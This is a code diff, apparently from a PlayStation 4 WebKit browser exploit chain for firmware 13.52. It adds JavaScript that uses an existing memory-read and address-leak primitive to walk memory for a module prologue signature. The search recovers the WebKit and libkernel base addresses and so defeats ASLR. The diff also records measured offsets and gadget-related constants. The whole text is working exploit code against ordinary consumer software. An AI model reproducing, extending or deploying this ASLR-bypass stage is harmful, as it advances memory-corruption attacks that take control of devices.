@@ -7,6 +7,13 @@ const POOPS_SCAN_LO = 0x10000;
 const POOPS_OOM_LO = 0x2f000;
 const POOPS_OOM_HI = 0x34000;
 
+/** Sony module .text prologue (matches poc chain_1352 MEASURE-13.52). */
+const TEXT_MAGIC = [0xe5894855, 0x56415741, 0x54415541, 0x8d485053];
+const WALK_MAX_BACK = 0x2800000;
+const LIBK_WALK_MAX = 0x80000;
+/** Browser WebKit GOT __error when off.wk___imp___error is null (measure only). */
+const WK_IMP_ERROR_MEASURE = 0x3cb8cc8;
+
 const IMPORT_PLT_CANDS = [
     0x178, 0x188, 0x8d8, 0x918, 0x2438, 0x500, 0x600, 0x800, 0xa00, 0xc00,
     0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
@@ -36,6 +43,95 @@ export function pageAlignDown(addr, align) {
 
 export function lkAligned(lk) {
     return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+}
+
+export function textMagicAt(p, addr) {
+    const q0 = read8p(p, addr);
+    const q1 = read8p(p, addr.add32(8));
+    if (!q0 || !q1) return false;
+    return q0.low === TEXT_MAGIC[0] && q0.hi === TEXT_MAGIC[1]
+        && q1.low === TEXT_MAGIC[2] && q1.hi === TEXT_MAGIC[3];
+}
+
+/**
+ * Runtime webkit + libkernel bases (poc chain_1352.js MEASURE-13.52).
+ * Gadget RVAs in ps4_13.52 still come from the measured row; this finds ASLR bases.
+ */
+export function measureBases1352(p, off) {
+    const out = {
+        webkit: null,
+        libkernel: null,
+        nativeFn: null,
+        errImport: null,
+        measExpm1: 0,
+        verdict: "skipped",
+        detail: "",
+    };
+    if (!p || !off) return out;
+    try {
+        const mCell = p.leakval(Math.expm1);
+        const mFunc = read8p(p, mCell.add32(0x18));
+        const mFn = mFunc
+            ? read8p(p, mFunc.add32(off.wk_JSFunction_m_function)) : null;
+        if (!mFn) {
+            out.verdict = "THREW";
+            out.detail = "nativeFn";
+            return out;
+        }
+        out.nativeFn = mFn;
+        const page = v => pageAlignDown(v, 0x4000);
+        let cand = null;
+        let steps = 0;
+        const seedCand = mFn.sub32(off.wk_expm1_builtin);
+        if ((seedCand.low & 0x3fff) === 0 && textMagicAt(p, seedCand))
+            cand = seedCand;
+        else {
+            for (let back = 0; back <= WALK_MAX_BACK; back += 0x4000) {
+                const at = page(mFn).sub32(back);
+                if (textMagicAt(p, at)) { cand = at; break; }
+                steps++;
+            }
+        }
+        if (!cand || !cand.hi) {
+            out.verdict = "DIFFERS-no-text-magic";
+            out.detail = "nativeFn=" + mFn + " walked=" + steps;
+            return out;
+        }
+        out.webkit = cand;
+        out.measExpm1 = mFn.sub32(cand.low).low >>> 0;
+        out.verdict = "CONFIRMED";
+        const impRva = (typeof off.wk___imp___error === "number" && off.wk___imp___error > 0)
+            ? off.wk___imp___error : WK_IMP_ERROR_MEASURE;
+        const errFn = read8p(p, cand.add32(impRva));
+        if (errFn) {
+            out.errImport = errFn;
+            const epage = pageAlignDown(errFn, 0x4000);
+            for (let back = 0; back <= LIBK_WALK_MAX; back += 0x4000) {
+                const at = epage.sub32(back);
+                if (textMagicAt(p, at)) {
+                    out.libkernel = at;
+                    break;
+                }
+            }
+            if (!out.libkernel)
+                out.verdict = "DIFFERS-libk-no-text-magic";
+            if (off.k__error) {
+                const kCand = errFn.sub32(off.k__error);
+                const bothOk = errFn.hi > 0 && errFn.low >= 0x1000
+                    && kCand.hi > 0 && (kCand.low & 0x3fff) === 0;
+                if (bothOk) out.verdict = "CONFIRMED";
+            }
+        } else {
+            out.verdict = "DIFFERS-import-read";
+        }
+        out.detail = "webkit=" + cand + " meas_expm1=0x" + out.measExpm1.toString(16)
+            + " errfn=" + (errFn || "-")
+            + " libkernel=" + (out.libkernel || "-");
+    } catch (e) {
+        out.verdict = "THREW";
+        out.detail = e && e.message ? e.message : String(e);
+    }
+    return out;
 }
 
 export function parseHexAddr(hex) {
